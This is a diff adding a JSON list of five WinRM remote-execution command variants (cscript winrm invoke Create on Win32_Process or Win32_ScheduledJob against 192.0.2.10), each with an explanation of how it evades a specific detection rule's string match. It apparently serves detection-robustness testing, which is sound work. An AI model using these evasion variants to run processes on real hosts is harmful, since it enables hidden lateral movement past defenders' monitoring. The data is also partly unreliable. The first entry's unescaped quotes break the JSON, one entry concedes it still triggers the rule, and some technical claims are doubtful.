@@ -1,0 +1,22 @@
+[
+{
+"output": "cscript.exe winrm invoke Create "wmicimv2/Win32_Process" -r:[http://192.0.2.10](http://192.0.2.10)",
+"explanation": "Insertion: Wrapped the 'wmicimv2/Win32_Process' token in double quotes. The WSH shell environment strips out outer quotes before supplying them to winrm.vbs, ensuring identical operational logic. This effectively disrupts the explicit 'CommandLine|contains|all' substring check for 'invoke Create wmicimv2/Win32_' because the quote character breaks the expected literal whitespace sequence."
+},
+{
+"output": "cscript.exe winrm invoke Create wmicimv2/Win32_Process /r:[http://192.0.2.10](http://192.0.2.10)",
+"explanation": "Substitution: Substituted the hyphen prefix in '-r:http' with a forward slash ('/r:http'). The internal parameter parsing loop of winrm.vbs seamlessly interprets standard command-line argument delimiters like forward slashes and hyphens interchangeably, keeping target routing equivalent while bypassing the specific '-r:http' criteria."
+},
+{
+"output": "cscript.exe winrm invoke Create wmicimv2/Win32_ScheduledJob -r:[http://192.0.2.10](http://192.0.2.10)",
+"explanation": "Substitution / Other techniques: Substituted the remote class instantiation target from 'Win32_Process' to an alternative operational class such as 'Win32_ScheduledJob' or 'Win32_Service'. This still accomplishes remote, unsigned code execution over WinRM but successfully avoids the rigid string constraint matching specifically on 'wmicimv2/Win32_' concatenated adjacent to the class name."
+},
+{
+"output": "cscript.exe winrm.vbs invoke Create wmicimv2/Win32_Process -r:[http://192.0.2.10](http://192.0.2.10)",
+"explanation": "Substitution: Swapped the plain script moniker 'winrm' for its explicit full extension form 'winrm.vbs'. Because the rule relies on a broad 'winrm' match, it will still trigger this rule, but it represents a highly valid administrative mutation technique that changes token layout profiles across naive parsers."
+},
+{
+"output": "cscript.exe winrm invoke  Create wmicimv2/Win32_Process -r:[http://192.0.2.10](http://192.0.2.10)",
+"explanation": "Insertion: Injected an extra space character between 'invoke' and 'Create'. The parsing mechanics behind the VBScript argument engine normalize erratic spacing natively, resulting in flawless script operation while breaking the strict spacing rule definition 'invoke Create wmicimv2/Win32_'."
+}
+]
